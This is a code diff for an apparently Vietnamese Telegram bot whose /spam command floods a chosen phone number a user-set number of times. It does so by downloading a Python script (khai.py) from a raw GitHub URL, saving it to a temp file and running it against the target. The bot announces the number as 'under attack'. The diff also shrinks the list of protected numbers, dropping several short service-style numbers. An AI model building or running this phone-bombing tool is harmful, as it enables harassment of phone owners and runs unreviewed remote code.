@@ -390,32 +390,27 @@ def diggory(message):
     bot.send_message(message.chat.id, diggory_chat)
 
 
+last_usage = {}
+
 @bot.message_handler(commands=['spam'])
 def spam(message):
     user_id = message.from_user.id
-
-
-    if len(message.text.split()) == 1:
-        bot.send_message(chat_id=message.chat.id, text="Vui lòng nhập số điện thoại cần spam.")
+    
+    current_time = time.time()
+    if user_id in last_usage and current_time - last_usage[user_id] < 10:
+        bot.reply_to(message, f"Vui lòng đợi {10 - (current_time - last_usage[user_id]):.1f} giây trước khi sử dụng lệnh lại.")
         return
-     
-    params = message.text.split()
-    username = message.from_user.username
     
-    diggory_chat = f'''
-┌───⭓ {name_bot}
-│» Reply User: @{username}
-│» Vui lòng nhập đầy đủ thông tin
-│» Lệnh ví dụ là /spam 0123456789 10  (số lần spam)
-└───────
-    '''
-    
-    if len(params) < 3:
-        bot.reply_to(message, diggory_chat)
+    last_usage[user_id] = current_time
+
+    params = message.text.split()[1:]
+
+    if len(params) < 2:
+        bot.reply_to(message, "Vui lòng nhập đầy đủ thông tin.")
         return
 
-    sdt = params[1]
-    count = params[2]
+    sdt = params[0]
+    count = params[1]
 
     if not count.isdigit():
         bot.reply_to(message, "Số lần spam không hợp lệ. Vui lòng nhập một số nguyên dương.")
@@ -431,35 +426,29 @@ def spam(message):
         bot.reply_to(message, f"Số điện thoại {sdt} đã bị cấm spam.")
         return
 
-    chat_id = message.chat.id
-    
     diggory_chat3 = f'''
 ┌──────⭓ {name_bot}
-│ User: @{username}
 │ Spam: Thành Công 
 │ Số Lần Spam Free: {count}
 │ Đang Tấn Công : {sdt}
 └─────────────
     '''
-    
-    # Fetch khai.py from the web URL
+
     script_url = "https://raw.githubusercontent.com/luvanlong01122007/luvanlong01122007/main/khai.py"
     try:
         response = requests.get(script_url)
         if response.status_code == 200:
-            # Save the script content to a temporary file
             with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                 temp_file.write(response.content)
                 temp_file_path = temp_file.name
-            # Execute the fetched script
             process = subprocess.Popen(["python", temp_file_path, sdt, str(count)])
-            bot.send_message(chat_id, diggory_chat3)
+            bot.send_message(message.chat.id, diggory_chat3)
         else:
             bot.reply_to(message, f"Không thể lấy script từ {script_url}. Mã lỗi: {response.status_code}")
     except Exception as e:
         bot.reply_to(message, f"Lỗi khi lấy script từ {script_url}: {str(e)}")
 
-blacklist = ["0789041631", "112", "111", "1", "113", "114", "115", "116", "117"]
+blacklist = ["0789041631", "112"]
 import requests
 import tempfile
 
@@ -481,7 +470,7 @@ def supersms(message):
 ┌───⭓ {name_bot}
 │» Reply User: @{username}
 │» Vui lòng nhập đầy đủ thông tin
-│» Lệnh ví dụ là /spam 0123456789 100  (số lần spam)
+│» Lệnh ví dụ là /spam 0123456789 30  (số lần spam)
 └───────
     '''
     
